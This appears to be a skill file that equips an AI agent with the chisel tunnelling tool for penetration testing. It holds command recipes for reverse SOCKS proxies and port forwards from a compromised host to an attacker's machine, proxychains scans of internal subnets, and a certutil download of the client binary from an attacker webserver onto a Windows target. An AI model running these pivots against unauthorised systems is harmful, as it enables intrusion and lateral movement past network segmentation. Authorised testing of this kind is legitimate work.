---
name: chisel-tunnel
description: "Chisel — быстрое туннелирование TCP/UDP через HTTP для тестирования сегментации сети и обхода NAT. Расположен: /usr/local/bin/chisel."
allowed-tools: Bash(chisel *), Read
---

# chisel-tunnel

Binary: `/usr/local/bin/chisel`

## Pivot patterns

### SOCKS5 proxy (most common)

```bash
# Attacker (server mode)
chisel server -p 8080 --reverse

# Target machine (client mode) — creates SOCKS5 on attacker at 127.0.0.1:1080
chisel client <attacker-ip>:8080 R:socks

# Use with proxychains (set socks5 127.0.0.1 1080 in /etc/proxychains.conf)
proxychains nmap -sT -p 80,443,8080 <internal-host>
proxychains nxc smb <internal-subnet>/24
```

### Port forward

```bash
# Forward attacker:3306 → internal MySQL (via compromised host)
# Attacker:
chisel server -p 8080 --reverse
# Target:
chisel client <attacker-ip>:8080 R:3306:<internal-mysql-host>:3306
# Now: mysql -h 127.0.0.1 -P 3306 on attacker

# Local forward (expose internal port to target's local network)
chisel client <server>:8080 9090:<internal>:80
```

### Windows client (upload and run)

```bash
# Transfer chisel.exe to target
# Inside netexec/meterpreter:
upload /usr/local/bin/chisel chisel.exe
# Or download from attacker webserver:
certutil -urlcache -f http://<attacker>:8000/chisel.exe chisel.exe
.\chisel.exe client <attacker-ip>:8080 R:socks
```
